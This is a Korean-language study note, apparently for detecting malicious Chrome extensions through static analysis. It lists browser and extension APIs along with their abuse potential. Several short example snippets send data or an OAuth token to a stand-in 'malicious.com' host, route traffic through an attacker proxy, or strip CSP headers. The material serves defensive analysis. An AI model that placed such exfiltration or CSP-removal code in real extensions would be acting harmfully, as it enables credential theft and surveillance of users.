
Chrome Web Store에 등록되어 있어서 user에게 악성 행위를 할 가능성이 있는 익스텐션들을 정적 분석할 때 고려해야 할 점은 다음과 같다.

- 익스텐션이 웹 화면에서 어디서부터 어디까지 접근이 가능한가?
	- 익스텐션 JS 함수 중, 웹의 내용을 얻어오는 함수를 리스팅한다.
	- 웹에 어떤 정보에 접근하는가?
	- 익스텐션이 얻은 컨텐츠를 어디에 보내는가? 혹은, 로컬에서 처리하는가?
- JS에서 어떤 함수들이 사용되는가(악용될 수 있는 함수의 존재 여부와 사용 방식)?


따라서, JS에서 함수를 살펴보며 리스팅하고 익스텐션에서 검출한 뒤, 그 ==행위를 유추==한다. 우선 살펴볼 함수의 선정 기준은 아래와 같이 다양하게 떠올려 보았다.

- 우리가 보는 웹 컨텐츠에 굉장히 직접적으로 접근하는 함수
- 내부 `HOST`와 통신하는 함수
- 웹 브라우저 컨텐츠를 읽는 함수
- 쿠키 정보를 읽는 함수


악성의 가능성이 있는 함수를 리스팅하고, 함수가 실행될 때의 필요한 `permission` 까지 깊게 조사해보려한다. 그 후, 모델링을 통해 함수의 동작 원리를 추적/유추한다.
모델링의 예는 다음과 같다. 한 익스텐션은 사용자가 입력한 패스워드를 탈취하는 행위를 한다고 가정해보자.
이 행위의 동작 원리는 이러할 것이다:<br>
	1. 화면에 `password` 입력 박스를 선택한다.<br>
	2. `password` 정보를 copy한다.<br>
	3. copy한 정보를 포스트 메시지를 통해 외부 `url`로 보낸다.

아래 이미지는 위 과정처럼 함수의 행위를 리스팅 한 좋은 예시이다(출처: DVa: Extracting Victims and Abuse Vectors from Android Accessibility Malware).
![Figure 2](functions_1.png)

이처럼 함수 리스팅을 통해 다양한 함수가 섞여 악성 트랜잭션을 만들어내는 과정을 모델링 하려고 한다.
대표적인 함수 카테고리는 4개로 구분 가능하다:<br>
	1. 파일시스템 접근<br>
	2. 네트워크 접근<br>
	3. 렌더링 관련<br>
	4. User Interaction(e.g. 좌우 클릭, 드래그, etc)

추가로, 각 익스텐션이 실행될 제약조건 또한 카테고리화하는 것도 고려한다. 예를 들어 웹 사이트의 `status`를 체크하여 특수한 환경에서 작동하는 익스텐션들의 제약 조건을 카테고리화한다면, 익스텐션이 악의적인 목적을 가지고 웹에 접근했을 때 그 익스텐션이 특정 조건에서만 실행되도록 설계되었는지 분석할 수 있다.

악성 익스텐션은 정상적인 환경에서는 활동을 숨기고, 특정 조건(e.g. 특정 도메인, 사용자 로그인 상태, 개발자 도구 비활성화 등)에서만 악성 행위를 수행할 수 있다. 이를 정적 분석을 통해 탐지하려면, 익스텐션이 실행될 **제약 조건**을 카테고리로 분류할 수 있다.

## File system
---
### File system API

**1. Web File API (File, Blob, FileReader, FileSystem API)**

→ 파일 내용을 조작하거나 사용자의 파일 정보 탈취 가능

**2. IndexedDB API**

→ 대량의 데이터를 저장하여 사용자 추적 가능

**3. Storage API (LocalStorage, SessionStorage, Cookies)**

→ 악성 코드가 사용자 데이터를 저장 및 탈취 가능

**4. File System Access API (Chrome 전용, window.showOpenFilePicker 등)**

→ 사용자의 로컬 파일을 읽거나 변조할 가능성이 있음.

**5. Web Share API (navigator.share)**

→ 피싱 링크나 중요 정보를 무단으로 공유하도록 유도 가능.

**6. Clipboard API (navigator.clipboard.readText, writeText)**

→ 사용자가 복사한 민감한 정보를 탈취하거나 변조 가능.

### **1. Web File API (File, Blob, FileReader, FileSystem API)**

📌 **브라우저에서 파일을 다루는 기능을 제공하는 API**

**(1) File API**

- `input[type="file"]`
    - 사용자가 파일을 선택하도록 유도
    - **악용 가능성:** 사용자가 선택한 파일을 악성 코드가 조작할 수 있음
- `file.name`, `file.type`, `file.size`, `file.lastModified`
    - 파일의 이름, 유형, 크기, 마지막 수정 날짜를 가져옴
    - **악용 가능성:** 사용자의 파일 정보를 수집하여 프로파일링 가능

**(2) Blob API**

- `new Blob([data], { type: "text/plain" })`
    - 메모리 내에서 파일 데이터를 생성
    - **악용 가능성:** Blob URL을 활용한 XSS 공격 가능

**(3) FileReader API**

- `FileReader.readAsText(file)`
    - 파일을 문자열로 읽음
    - **악용 가능성:** 사용자가 업로드한 파일의 내용을 조작하여 악성 스크립트 실행 가능
- `FileReader.readAsDataURL(file)` - DataURL = base64
    - 파일을 Base64 데이터로 변환
    - **악용 가능성:** 이미지, 동영상 등을 변조하여 피싱 페이지에 사용 가능
- `FileReader.readAsArrayBuffer(file)`
    - 파일을 바이너리 데이터로 읽음
    - **악용 가능성:** 실행 가능한 바이너리 파일을 조작하여 악성 코드 실행 가능

**(4) FileSystem API (비표준, 일부 브라우저 지원)**

- `window.requestFileSystem()`
    - 브라우저 내부의 파일 시스템을 관리
    - **악용 가능성:** 브라우저의 로컬 파일을 변조하여 악성 코드 저장 가능
- `fileEntry.createWriter()`
    - 파일 쓰기 작업을 수행
    - **악용 가능성:** 공격자가 저장된 파일을 변조할 가능성이 있음

### **2. IndexedDB API (브라우저 내 데이터베이스 저장소)**

📌 **대용량 데이터를 클라이언트 측에서 저장할 수 있도록 지원하는 API**

- `indexedDB.open("databaseName", version)`
    - 데이터베이스를 생성 또는 열기
    - **악용 가능성:** 악성 확장이 사용자 데이터를 임의의 DB에 저장하여 추적 가능
- `indexedDB.transaction(["storeName"], "readwrite")`
    - 데이터베이스에 읽기 및 쓰기 권한 부여
    - **악용 가능성:** 사용자가 인식하지 못하는 사이에 중요한 정보를 저장 가능
- `store.put(data, key)`
    - 특정 키에 데이터를 저장
    - **악용 가능성:** 악성 확장이 저장된 데이터를 변조하여 실행 가능한 악성 코드 삽입 가능

### **3. Storage API (LocalStorage, SessionStorage, Cookies)**

📌 **웹 브라우저의 클라이언트 측 저장소를 활용하는 API**

**(1) LocalStorage API**

- `localStorage.setItem("key", "value")`
    - 브라우저에 영구적으로 데이터 저장
    - **악용 가능성:** XSS 공격을 통해 localStorage에 저장된 민감한 정보를 탈취 가능
- `localStorage.getItem("key")`
    - 저장된 데이터 읽기
    - **악용 가능성:** 공격자가 document.domain을 변경하여 다른 사이트에서 저장된 데이터를 읽을 가능성

**(2) SessionStorage API**

- `sessionStorage.setItem("key", "value")`
    - 세션이 유지되는 동안 데이터 저장
    - **악용 가능성:** 악성 코드가 실행되는 동안 사용자 세션 데이터를 조작 가능
- `sessionStorage.getItem("key")`
    - 저장된 데이터 읽기
    - **악용 가능성:** 피싱 공격에서 세션 데이터를 가로채어 사용자의 계정을 탈취 가능

**(3) Cookie API**

- `document.cookie = "name=value; expires=Fri, 31 Dec 2023 23:59:59 GMT"`
    - 클라이언트 측 쿠키 설정
    - **악용 가능성:** JavaScript에서 쿠키를 읽어 서버로 전송하는 공격 가능 (XSS 기반 세션 하이재킹)
- `document.cookie`
    - 쿠키 데이터를 가져오기
    - **악용 가능성:** HttpOnly 속성이 없는 쿠키는 XSS 공격을 통해 탈취 가능

### **4. File System Access API (Chrome 전용, 로컬 파일 접근)**

📌 **사용자가 로컬 파일을 직접 읽고 수정할 수 있도록 지원하는 API**

- 브라우저가 파일 시스템을 직접 제어할 수 있도록 하며, 악성 확장 프로그램이 이를 악용할 가능성이 있음.

**(1) 파일 선택 및 읽기**

- `window.showOpenFilePicker()`
    - 사용자가 파일 선택 창을 통해 파일을 직접 선택
    - **악용 가능성:** 사용자가 무심코 중요한 파일을 선택하면, 악성 코드가 내용을 읽어 외부로 전송 가능
- `fileHandle.getFile()`
    - 사용자가 선택한 파일을 읽을 수 있도록 함
    - **악용 가능성:** 사용자가 선택한 민감한 파일의 내용을 서버로 전송할 가능성이 있음

**(2) 파일 저장 및 수정**

- `window.showSaveFilePicker()`
    - 사용자가 특정 파일을 저장할 수 있도록 파일 저장 창을 띄움
    - **악용 가능성:** 사용자가 저장한 파일에 악성 코드 삽입 가능
- `fileHandle.createWritable()`
    - 파일을 수정 가능한 상태로 열어 줌
    - **악용 가능성:** 정상적인 문서를 변조하여 악성 실행 파일로 변경할 수 있음
- `writable.write(data)`
    - 파일에 데이터를 쓰는 기능
    - **악용 가능성:** 기존의 정상적인 파일을 악성 파일로 덮어쓰기 가능
- `writable.close()`
    - 파일 쓰기 작업을 완료하고 닫음
    - **악용 가능성:** 사용자가 인식하지 못하는 사이에 악성 데이터가 저장될 가능성 있음

**발생할 수 있는 보안 취약점**

- 사용자가 실수로 중요한 파일을 열면 공격자가 내용을 읽을 가능성이 있음.
- 악성 확장이 정상 파일을 변조하여 악성 파일로 만들 수 있음.
- 파일 저장 시 악성 코드가 자동 실행되도록 조작 가능.

### **5. Web Share API (웹 페이지에서 직접 공유 기능 제공)**

📌 **사용자가 브라우저에서 직접 데이터를 공유할 수 있도록 하는 API**

- 웹 사이트가 로컬 장치의 공유 기능을 호출하여 특정 데이터를 공유할 수 있음.

**(1) 공유 기능 실행**

- `navigator.share({ title, text, url })`
    - 웹 페이지에서 OS의 공유 기능을 호출하여 사용자가 특정 데이터를 공유하도록 유도
    - **악용 가능성:** 사용자가 클릭하면 피싱 사이트나 악성 파일을 공유하도록 유도 가능
- `navigator.canShare(data)`
    - 공유할 데이터가 지원되는지 확인
    - **악용 가능성:** 공격자가 사용자의 공유 기능을 조작하여 중요한 데이터를 다른 애플리케이션으로 보내게 유도 가능

**발생할 수 있는 보안 취약점**

- 사용자가 원치 않는 사이트로 데이터를 공유하게 유도 가능.
- 피싱 링크를 공유하게 만들어 사용자를 속일 수 있음.
- 중요 정보를 공유하는 과정에서 무단 데이터 유출 가능.

### **6. Clipboard API (클립보드 접근 및 조작)**

📌 **웹 페이지에서 사용자의 클립보드 내용을 읽고 수정할 수 있도록 하는 API**

- 악성 확장 프로그램이 사용자의 클립보드 데이터를 조작할 가능성이 있음.

**(1) 클립보드 읽기**

- `navigator.clipboard.readText()`
    - 사용자가 복사한 텍스트를 읽어 옴
    - **악용 가능성:** 사용자가 복사한 비밀번호, 신용카드 번호 등의 민감한 데이터를 탈취 가능
- `navigator.clipboard.read()`
    - 클립보드에 저장된 이미지, 파일 등을 읽을 수 있음
    - **악용 가능성:** 사용자가 복사한 민감한 이미지나 파일을 악용 가능

**(2) 클립보드 쓰기**

- `navigator.clipboard.writeText("Hello, World!")`
    - 클립보드에 특정 텍스트를 저장
    - **악용 가능성:** 사용자가 URL을 복사할 때, 피싱 사이트 링크로 변경 가능
- `navigator.clipboard.write(data)`
    - 텍스트뿐만 아니라 이미지, 파일도 클립보드에 저장 가능
    - **악용 가능성:** 정상적인 데이터 대신 악성 코드가 포함된 파일을 삽입 가능

**발생할 수 있는 보안 취약점**

- 사용자가 복사한 비밀번호, 신용카드 정보를 탈취할 가능성 존재.
- 복사한 정상적인 URL을 피싱 사이트 링크로 변조 가능.
- 클립보드 데이터를 지속적으로 모니터링하여 사용자의 행동을 추적 가능.

## Network
---
### Network API

1. **Fetch API** (기본적인 HTTP 요청 및 악용 가능성)
    
    → 사용자 데이터를 외부 서버로 전송하거나 응답을 변조 가능.
    
2. **XMLHttpRequest API** (구형 네트워크 요청 API, 여전히 악용 가능) → 구형 API라 보안성이 낮고, 공격자가 악용하여 데이터를 탈취 가능.
    
3. **WebSockets API** (실시간 데이터 전송, 사용자 정보 유출 가능)
    
    → 실시간 데이터 전송을 악용하여 지속적으로 사용자 정보를 유출 가능.
    
4. **Beacon API** (페이지 종료 시 데이터 전송)
    
    → 사용자가 페이지를 떠날 때 개인정보를 무단으로 외부로 전송 가능.
    
5. **WebRTC API** (P2P 네트워크, IP 주소 유출 가능)
    
    → P2P 연결을 통해 사용자의 실제 IP 주소를 유출할 가능성 있음.
    
6. **Chrome.webRequest API** (네트워크 트래픽 가로채기 및 변조 가능)
    
    → 브라우저 트래픽을 감시하고 변조하여 보안 정책을 우회 가능.
    
7. **Chrome.identity API** (OAuth 인증 및 악용 가능성)
    
    → OAuth 토큰을 탈취하여 사용자의 Google 계정에 무단 접근 가능.
    
8. **Chrome.proxy API** (프록시 변경을 통한 악성 트래픽 유도 가능)
    
    → MITM 공격을 통해 트래픽을 감청하거나 피싱 사이트로 유도 가능.
    
9. **Chrome.dns API** (DNS 요청 감지 및 스푸핑 가능)
    
    → DNS 요청을 감시하여 사용자의 웹사이트 접속을 추적하고, 피싱 공격에 활용 가능.
    

### **1. Fetch API (웹 표준 HTTP 요청 API)**

📌 **브라우저에서 HTTP 요청을 보내고 응답을 받을 수 있도록 하는 API**

- 최신 웹 애플리케이션에서 가장 많이 사용됨.
- 확장 프로그램이 이를 이용해 사용자 데이터를 외부로 전송할 가능성이 있음.

**(1) HTTP 요청 보내기**

- `fetch(url, options)`
    - 기본적인 HTTP 요청을 수행
    - **악용 가능성:** 민감한 사용자 데이터를 공격자의 서버로 전송 가능
- `fetch("<https://example.com/api>", { method: "POST", body: JSON.stringify(data) })`
    - JSON 데이터를 서버로 전송하는 방식
    - **악용 가능성:** 사용자의 로그인 세션을 하이재킹하여 무단 액세스 가능

**(2) 응답 처리 및 데이터 조작**

- `response.json()`
    - 서버에서 받은 JSON 데이터를 처리
    - **악용 가능성:** 중간자 공격(Man-in-the-Middle, MITM)을 통해 데이터를 변조할 수 있음
- `response.text()`
    - 응답을 일반 텍스트로 변환
    - **악용 가능성:** 악성 확장이 사용자 정보를 텍스트로 전송 가능

**발생할 수 있는 보안 취약점**

- 사용자가 인식하지 못하는 사이에 민감한 데이터를 외부 서버로 전송 가능.
- 공격자가 API 응답을 변조하여 악성 스크립트를 실행 가능.
- 인증 정보가 포함된 요청을 가로채어 세션 하이재킹 가능.

### **2. XMLHttpRequest API (구형 네트워크 요청 API)**

📌 **JavaScript에서 HTTP 요청을 처리할 수 있는 구형 API**

- Fetch API 등장 이후 사용량이 줄었지만, 여전히 악성 코드에서 사용됨.

**(1) HTTP 요청 보내기**

- `var xhr = new XMLHttpRequest(); xhr.open("GET", "<https://example.com>", true); xhr.send();`
    - 비동기 HTTP 요청을 수행
    - **악용 가능성:** 공격자가 특정 웹사이트에서 민감한 데이터를 요청하고 가로챌 수 있음
- `xhr.open("POST", "<https://malicious.com>", true); xhr.send(data);`
    - POST 요청을 통해 데이터 전송
    - **악용 가능성:** 사용자의 로그인 정보나 쿠키를 외부 서버로 유출 가능

**(2) 응답 처리 및 변조 가능성**

- `xhr.onreadystatechange = function() { if (xhr.readyState == 4) { console.log(xhr.responseText); } }`
    - 서버 응답을 받아서 처리 (readyState = 4 → Data Receive Completed)
    - **악용 가능성:** MITM 공격(Man-in-the-middle, 중간에서 데이터 훔침)을 통해 응답을 변조 가능

**발생할 수 있는 보안 취약점**

- 구형 API라서 보안 검토 없이 사용하면 XSS 공격 등에 취약.
- 중간자 공격으로 응답이 변조될 가능성이 높음.
- 악성 확장이 이를 활용하여 사용자 데이터를 외부로 전송할 가능성 있음.

### **3. WebSockets API (양방향 실시간 통신 API)**

📌 **웹 애플리케이션과 서버 간에 양방향 통신을 가능하게 하는 API**

- 네트워크 연결을 지속적으로 유지할 수 있어 실시간 데이터 전송에 사용됨.
- 악성 확장이 이를 이용하여 지속적으로 데이터를 전송하거나 감시할 가능성이 있음.

**(1) WebSocket 연결 생성**

- `const socket = new WebSocket("wss://example.com/socket")`
    - 서버와 지속적인 양방향 통신을 위한 WebSocket 연결을 생성
    - **악용 가능성:** 악성 확장이 사용자 정보를 지속적으로 외부 서버로 송신 가능

**(2) 서버와 메시지 교환**

- `socket.onmessage = (event) => { console.log(event.data); }`
    - 서버에서 받은 데이터를 처리
    - **악용 가능성:** 악성 코드가 실시간으로 사용자 정보를 수집하고 전송 가능
- `socket.send("message")`
    - 서버로 데이터를 전송
    - **악용 가능성:** 사용자의 민감한 데이터(입력된 패스워드, 쿠키)를 서버로 전송 가능

**(3) WebSocket 종료 및 우회 가능성**

- `socket.close()`
    - 연결 종료
    - **악용 가능성:** 보안 시스템이 WebSocket을 차단하면 악성 코드가 우회 방법을 찾을 가능성 있음

**발생할 수 있는 보안 취약점**

- 공격자가 WebSocket을 이용해 지속적으로 데이터를 외부로 유출할 가능성 존재.
- WebSocket 트래픽은 일반적인 HTTP 요청보다 감지하기 어려워 보안 솔루션을 우회할 가능성이 있음.
- 중간자 공격을 통해 서버와 클라이언트 간의 데이터를 변조할 가능성이 있음.

### **4. Beacon API (페이지 종료 시 데이터 전송)**

📌 **페이지가 닫히기 직전에 데이터를 서버로 전송하는 API**

- 페이지가 닫히거나 사용자가 이동할 때 데이터를 백그라운드에서 전송하는 기능을 수행.
- 일반적으로 분석, 로그 전송 등에 사용되지만 악성 코드가 이를 활용할 가능성이 있음.

**(1) 데이터 전송 방식**

- `navigator.sendBeacon(url, data)`
    
    - 페이지가 닫히기 직전에 지정된 URL로 데이터를 비동기 전송
    - **악용 가능성:** 사용자가 페이지를 떠날 때 자동으로 개인정보를 공격자 서버로 전송 가능
- **예제 코드**
    
    `window.addEventListener("unload", function() {`
    
    `navigator.sendBeacon("<https://malicious.com/track>", JSON.stringify({ data: "user_info" }));`
    
    `});`
    
- 사용자가 페이지를 떠날 때 자동으로 데이터를 공격자 서버에 전송
    

**발생할 수 있는 보안 취약점**

- 사용자가 인식하지 못한 상태에서 개인 정보가 탈취될 가능성이 있음.
- CSRF 공격(페이지 종료 시 자동 요청) 등에 악용될 가능성 존재.
- 보안 솔루션이 차단하기 어려운 방식이라 탐지하기 어려움.

### **5. WebRTC API (P2P 네트워크, IP 주소 유출 가능)**

📌 **WebRTC는 브라우저 간의 P2P 연결을 통해 오디오, 비디오, 데이터를 전송하는 API**

- 네트워크 프록시를 우회하여 직접 클라이언트 간 연결을 맺음.
- 사용자의 로컬 IP 주소가 유출될 가능성이 있음.

**(1) WebRTC 연결 생성**

- `new RTCPeerConnection()`
    
    - 브라우저 간 P2P 연결을 생성하는 객체
    - **악용 가능성:** 사용자의 실제 IP 주소를 노출하여 익명성을 깨뜨릴 가능성이 있음
- **예제 코드**
    
    `const peerConnection = new RTCPeerConnection();`
    
    `peerConnection.createDataChannel("channel");`
    
    `peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer));`
    
- WebRTC를 이용해 두 브라우저 간 직접 연결을 설정
    

**(2) IP 주소 유출 가능성**

- `peerConnection.onicecandidate = event => console.log(event.candidate);`
    
    - 로컬 IP 주소가 WebRTC를 통해 공개될 수 있음.
    - **악용 가능성:** VPN을 사용해도 실제 IP 주소가 노출될 가능성이 있음.
- event.candidate 값 예시
    
    `candidate:842163049 1 udp 1677729535 192.168.0.5 54321 typ host candidate:123456789 1 udp 100663295 203.0.113.25 45678 typ srflx candidate:987654321 1 udp 16777215 35.198.200.12 78901 typ relay`
    

**발생할 수 있는 보안 취약점**

- 사용자의 로컬 IP 주소가 노출될 가능성이 있음 (WebRTC Leak).
- 중간자 공격자가 P2P 연결을 가로채서 민감한 데이터 탈취 가능.
- 익명성을 유지하고자 하는 사용자(예: Tor, VPN 사용자의 경우)에게 치명적일 수 있음.

### **6. Chrome.webRequest API (네트워크 트래픽 감지 및 변조 가능)**

📌 **Chrome 확장이 네트워크 요청을 감지하고 수정할 수 있는 API**

- 웹사이트의 HTTP 요청 및 응답을 가로채어 변경할 수 있음.
- 정상적인 확장 프로그램은 광고 차단, 개인정보 보호 기능 등에 사용하지만, 악성 확장은 이를 악용할 가능성이 있음.

**(1) 네트워크 요청 가로채기**

- `chrome.webRequest.onBeforeRequest.addListener()`
    
    - HTTP 요청이 전송되기 전에 가로채는 기능
    - **악용 가능성:** 사용자의 입력 데이터를 변조하거나 감시 가능
- **예제 코드**
    
    `chrome.webRequest.onBeforeRequest.addListener(`
    
    `function(details) {`
    
    `console.log("Intercepted request: ", details.url);`
    
    `return { cancel: false };`
    
    `},`
    
    `{ urls: ["<all_urls>"] },`
    
    `["blocking"]`
    
    `);`
    
- 브라우저의 모든 네트워크 요청을 감시
    
- 이후의 Request 처리과정
    


**(2) 응답 데이터 변조**

- `chrome.webRequest.onHeadersReceived.addListener()`
    
    - HTTP 응답 헤더를 변경하는 기능
    - **악용 가능성:** 보안 정책(Content Security Policy, CSP)을 무력화할 수 있음
- **예제 코드**
    
    `chrome.webRequest.onHeadersReceived.addListener(`
    
    `function(details) {`
    
    `for (let header of details.responseHeaders) {`
    
    `if (header.name.toLowerCase() === "content-security-policy") {`
    
    `header.value = "";}`
    
    `}`
    
    `return { responseHeaders: details.responseHeaders };`
    
    `},`
    
    `{ urls: ["<all_urls>"] },`
    
    `["blocking", "responseHeaders"]`
    
    `);`
    
- CSP 정책을 제거하여 악성 스크립트 실행 가능
    

**발생할 수 있는 보안 취약점**

- 사용자의 모든 네트워크 요청을 감시하고 조작 가능.
- CSP 헤더를 제거하여 XSS 공격 가능.
- HTTP 요청을 변조하여 악성 사이트로 리디렉트 가능.

### **7. Chrome.identity API (OAuth 인증 및 사용자 정보 접근)**

📌 **OAuth 인증을 통해 사용자의 Google 계정에 접근할 수 있도록 하는 API**

- Chrome 확장 프로그램이 Google API에 접근하여 사용자의 계정 정보를 가져올 수 있음.
- 악성 확장이 이를 이용해 사용자의 민감한 데이터를 탈취할 가능성이 있음.

**(1) OAuth 인증 요청**

- `chrome.identity.getAuthToken({ interactive: true }, callback)`
    
    - 사용자의 Google 계정에 접근할 OAuth 토큰을 요청
    - **악용 가능성:** 악성 확장이 OAuth 토큰을 가로채어 사용자의 Google 계정에 무단 접근 가능
- **예제 코드**
    
    `chrome.identity.getAuthToken({ interactive: true }, function(token) {`
    
    `console.log("OAuth Token:", token);`
    
    `fetch("<https://malicious.com/api>", {`
    
    `method: "POST",`
    
    `headers: { Authorization: "Bearer " + token }`
    
    `});`
    
    `});`
    
- 악성 확장이 사용자의 OAuth 토큰을 외부 서버로 전송 가능
    

**(2) 사용자 정보 요청**

- `chrome.identity.getProfileUserInfo(callback)`
    - 현재 로그인한 사용자의 이메일 및 프로필 정보 요청
    - **악용 가능성:** 사용자의 이메일을 피싱 공격에 활용 가능

**발생할 수 있는 보안 취약점**

- 악성 확장이 OAuth 토큰을 탈취하여 사용자의 Google 계정에 무단 접근 가능.
- 사용자 이메일 및 프로필 정보를 이용한 피싱 공격 가능.
- OAuth 인증 요청을 위장하여 사용자를 속이고 권한을 부여하도록 유도 가능.

### **8. Chrome.proxy API (프록시 변경을 통한 트래픽 조작)**

📌 **브라우저의 프록시 설정을 변경하여 네트워크 트래픽을 조작하는 API**

- 정상적인 확장은 VPN 및 보안 프록시 기능을 제공하지만, 악성 확장은 이를 이용하여 트래픽을 가로챌 가능성이 있음.

**(1) 프록시 설정 변경**

- `chrome.proxy.settings.set({ value: { mode: "fixed_servers", rules: { singleProxy: { host: "malicious.com", port: 8080 } } } })`
    
    - 사용자의 모든 네트워크 트래픽을 특정 서버를 통해 우회하도록 설정
    - **악용 가능성:** 사용자의 브라우징 데이터를 중간자 공격(MITM) 방식으로 감청 가능
- **예제 코드**
    
    `chrome.proxy.settings.set({`
    
    `value: {`
    
    `mode: "fixed_servers",`
    
    `rules: {`
    
    `singleProxy: {`
    
    `scheme: "http",`
    
    `host: "malicious.com",`
    
    `port: 8080`
    
    `}`
    
    `}`
    
    `}`
    
    `});`
    
- 사용자의 네트워크 요청을 공격자의 서버를 통해 전달하여 감청 가능
    

**(2) 프록시 설정 읽기**

- `chrome.proxy.settings.get({}, callback)`
    - 현재 브라우저의 프록시 설정을 가져옴
    - **악용 가능성:** 사용자의 네트워크 설정을 감시하고 특정 사이트에서만 악성 동작 수행 가능

**발생할 수 있는 보안 취약점**

- 악성 확장이 사용자의 트래픽을 가로채어 민감한 데이터를 탈취할 가능성 있음.
- 공격자가 MITM 공격을 수행하여 HTTPS 트래픽을 복호화할 가능성 존재.
- 특정 웹사이트 접속을 차단하거나 피싱 사이트로 리디렉트할 가능성 있음.

### **9. Chrome.dns API (DNS 요청 감지 및 스푸핑 가능)**

📌 **웹사이트의 DNS 정보를 조회하는 기능을 제공하는 API**

- 특정 웹사이트의 IP 주소를 확인하여 접속을 우회하거나 차단하는 기능을 수행.
- 악성 확장이 이를 악용하여 DNS 스푸핑 공격을 수행할 가능성이 있음.

**(1) DNS 조회 요청**

- `chrome.dns.resolve("example.com", callback)`
    
    - 특정 도메인의 IP 주소를 조회
    - **악용 가능성:** 사용자가 특정 도메인(예: 은행 사이트)에 접속했는지 감시 가능
- **예제 코드**
    
    `chrome.dns.resolve("example.com", function(response) {`
    
    `console.log("Resolved IP:", response.address);`
    
    `});`
    
- 사용자의 웹사이트 접속 여부를 추적할 가능성 있음
    

**(2) DNS 트래픽 감시**

- `chrome.webRequest.onBeforeRequest.addListener()`
    - **악용 가능성:** 사용자가 방문한 사이트 목록을 추적하여 스팸 공격 또는 피싱 공격에 활용 가능

**발생할 수 있는 보안 취약점**

- 악성 확장이 사용자의 DNS 요청을 감시하여 브라우징 습관을 추적 가능.
- 특정 웹사이트 접속을 감지하고 피싱 사이트로 리디렉트 가능.
- DNS 정보를 변경하여 사용자를 악성 서버로 유도 가능.

## 렌더링
---
### DOM 조작 관련

> `document.createElement(tagName)` 
- `tagName`에 해당하는 HTML 요소를 동적으로 생성한다.
- 생성된 요소는 DOM에 추가되기 전까지 화면에 보이지 않는다.

>  document.appendChild(node)`
- 지정된 노드를 특정 부모 요소의 마지막 자식으로 추가한다.
- 기존의 다른 부모가 있으면 해당 부모에서 제거된 후 새 부모에 추가된다.

> `element.innerHTML`
- 특정 요소의 HTML 내용을 문자열로 읽거나 설정하는 속성이다
- 기존 내용을 덮어쓰므로, 외부 입력 값을 삽입하는 경우, ==XSS 공격에 취약할 수 있다.==

> `document.querySelector(selector)`
>`document.getElementById(id)`
- CSS 선택자를 사용하여 첫 번째 일치하는 요소를 반환한다.
- ID 값을 기준으로 요소를 반환한다.

> `element.style.*`
- 요소의 스타일을 변경하는 속성이다.
- Example: `style.backgroundColor = "red`

> `Mutation.Observer()`
- DOM 변경을 감지하는 API이다.
- ==크롬 익스텐션에서 웹페이지 변경을 감지하고 자동으로  조치를 취하는 경우 사용된다.==


### Chrome Extension 및 브라우저 API

> `chrome.tabs.executeScript()`
- 현재 활성화된 탭에서 특정 스크립트를 실행하는 API이다.
- `manifest.json`에서 `tabs` 권한이 필요하다.
- ==악성 extension은 이를 이용해 원격 코드를 실행==할 수 있다.

> `setTimeout()`
> `setInterval()`
- 지정된 시간이 지나면 한 번만 실행한다.
- 지정된 간격마다 반복 실행한다.
- ==악성 코드 실행을 지연하는 방법으로 활용==될 수 있다.

>  `canvas.getContext("2d")
>  `CanvasRenderingContext2D.drawImage()`
- HTML canvas 요소를 조작하는 API이다.
- `drawImage()`는 이미지 렌더링에 사용된다.
- ==canvas는 브라우저 핑거프린팅에 악용==될 수 있다.

>  `document.designMode = "on"`
- 웹 페이지의 모든 콘텐츠를 직접 편집 가능하게 만드는 속성이다.
- 본래는 테스트 및 디버깅 용도로 사용하지만, ==악성 확장 프로그램이 페이지 내용을 변경할 수 있다.==

> `shadowRoot`
> `attachShadow()`
- Shadow DOM을 생성하여 요소를 격리된 DOM 트리로 관리한다.
- 악성 extension이 ==난독화된 UI를 삽입==할 수 있다.

>  `window.open()`
> `chrome.windows.create()`
> `chrome.tabs.create()`
- 새 창, 새 브라우저 창, 새 탭을 연다.
- ==광고성 팝업, 피싱 사이트로 redirection하는 extension에서 악용== 가능하다.

> `chrome.notifications.create()`
- Chrome extension에서 알림을 표시하는 API이다.
- ==스팸 알림을 보내거나 피싱 링크를 포함==할 수 있다.

## User Interaction
---
### 이벤트 리스너 (User input listeners)

> `addEventListener("click", ...)`
> `addEventListener("keydown", ...)`
- 클릭, 키 입력 등의 이벤트가 발생하면 지정된 함수를 실행한다.
- *click 이벤트를 가르채서 피싱 버튼 클릭 유도 가능성* 이 있다.

> `document.onmousemove`
> `document.onkeypress`
> `document.onkeydown`
- 마우스 이동 감지, 키 입력 감지, 키보드 입력 감지
- 마우스 움직임 데이터를 기록하면 *사용자 행동 추적 가능성* 이 있다.
- `onkeypress`를 사용하여 *비밀번호 입력 감지 가능성* 이 있다.

> `window.onbeforeunload`
- 페이지 종료를 감지한다.
- *페이지를 떠날 때 데이터를 서버로 전송* 하는지 확인할 필요가 있을 수도 있다.


### 클립보드 접근

> `navigator.clipboard.writeText()`
> `navigator.clipboard.readText()`
- 클립보드에 텍스트를 복사한다.
- 클립보드에서 텍스트를 읽는다.
- ==사용자가 복사한 내용(pw, 카드 번호)을 탈취할 가능성이 있다.==

> `chrome.contextMenus.create()`
- extension에서 브라우저 우클릭 메뉴를 변경할 수 있다.
- *악성 extenion이 우클릭 메뉴를 추가하여 피싱 페이지로 유도할 가능성* 이 있다.


### 예약 작업 수행

>  `chrome.alarms.create()`
- 특정 시간 후에 지정된 작업을 실행하는 예약 기능이다.
- 악성 익스텐션이 ==Delayed Execution==을 수행할 가능성이 있다.

>  `chromenotifications.onClicked.addListener()`
- 익스텐션이 생성한 알림을 클릭했을 때 이벤트를 발생시킨다.
- ==스팸 알림을 통한 악성 사이트 유도 가능성==이 있다.

 > `chrome.permissions.request()`
- 익스텐션이 특정 권한을 요청할 수 있다.
- ==민감한 권한 요청 여부를 확인==한다.
- 정상적인 익스텐션 -> 초기 설치 시 필요한 권한을 한 번에 요청한다.

>  `chrome.tabs.onActivated.addListener()`
- 사용자가 활성화한 탭 변경을 감지한다.
- 특정 웹사이트에서만 실행되는 익스텐션인지 확인한다.


### Open Authorization

> `chrome.identity.getAuthToken()`
- OAuth 인증을 통해 Google API에 접근한다.
- 사용자가 로그인을 하면 OAuth 토큰을 발급받아 특정 Google 서비스에 접근할 수 있다.
- `manifest.json`에서 `identity` 또는 `identity.email` 권한이 필요하다.


### 팝업 메시지

> `window.alerrt()`
> `window.confirm()`
> `window.prompt()`
- 단순 메시지, 확인/취소 버튼이 있는 다이얼 로그, 입력을 받을 수 있는 다이얼 로그.
- ==가짜 보안 경고창을 표시==할 수 있다.